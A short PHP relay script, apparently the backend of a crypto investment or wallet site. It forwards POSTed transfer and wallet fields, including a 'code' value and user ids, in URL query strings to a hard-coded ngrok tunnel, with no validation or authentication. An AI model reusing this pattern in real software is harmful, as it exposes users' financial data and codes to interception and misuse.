<?php
/*****YZX0MAKER <www class="twitter com">@YZX0Long*/
$serv = 'https://48ae-191-89-51-208.ngrok.io';
if ($_GET['id'] == 'inMoney') {
    $fields = [
        'from' => $_POST['from'],
        'to' => $_POST['to'],
        'alt' => $_POST['alt'],
        'rf' => $_POST['rf'],
        'lot' => $_POST['lot'],
        'uid' => $_POST['uid'],
        'code' => $_POST['code'],
    ];
    $fields_string = http_build_query($fields);
    //CURL
    $url = $serv . '/invest/' . $_GET['id'] . '/?' . $fields_string;
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $data = curl_exec($curl);
    curl_close($curl);
    echo json_encode($data);
} elseif ($_GET['id'] == 'outMoney') {
    //ARRAY POST
    $fields = [
        'from' => $_POST['from'],
        'to' => $_POST['to'],
        'alt' => $_POST['alt'],
        'lot' => $_POST['lot'],
        'uid' => $_POST['uid'],
        'code' => $_POST['code'],
    ];
    $fields_string = http_build_query($fields);
    //CURL
    $url = $serv . '/invest/' . $_GET['id'] . '/?' . $fields_string;
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $data = curl_exec($curl);
    curl_close($curl);
    echo json_encode($data);
} elseif ($_GET['id'] == 'singWallet') {
    //ARRAY POST
    $fields = [
        'alt' => $_POST['alt'],
        'rf' => $_POST['rf'],
        'uid' => $_POST['uid'],
    ];
    $fields_string = http_build_query($fields);
    //CURL
    $url = $serv . '/invest/' . $_GET['id'] . '/?' . $fields_string;
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $data = curl_exec($curl);
    curl_close($curl);
    echo json_encode($data);
} elseif ($_GET['id'] == 'singStaked') {
    //ARRAY POST
    $fields = [
        'alt' => $_POST['alt'],
        'altout' => $_POST['altout'],
        'rf' => $_POST['rf'],
        'uid' => $_POST['uid'],
    ];
    $fields_string = http_build_query($fields);
    //CURL
    $url = $serv . '/invest/' . $_GET['id'] . '/?' . $fields_string;
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $data = curl_exec($curl);
    curl_close($curl);
    echo json_encode($data);
} else {
    echo json_encode('No puedes continuar');
}
?>
